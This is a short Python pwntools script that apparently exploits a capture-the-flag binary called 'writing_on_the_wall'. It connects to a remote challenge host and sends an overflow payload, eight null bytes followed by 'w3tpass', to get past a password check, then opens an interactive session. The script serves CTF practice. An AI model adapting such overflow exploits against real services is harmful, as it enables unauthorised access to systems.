import pwn

pwn.context.log_level = 'DEBUG'

elf = pwn.ELF('./writing_on_the_wall')
pwn.context.binary = elf
libc = pwn.ELF('./glibc/libc.so.6', checksec=False)

# p = elf.process()
p = pwn.remote('94.237.55.212', 30524)

payload = b'w3tpass' # overflow
payload = pwn.p64(0x0)
payload += b'w3tpass'

print(payload)
print(payload.hex())
print(len(payload), 'bytes')

print(p.recvuntil(b'>> '))
p.sendline(payload)

p.interactive()
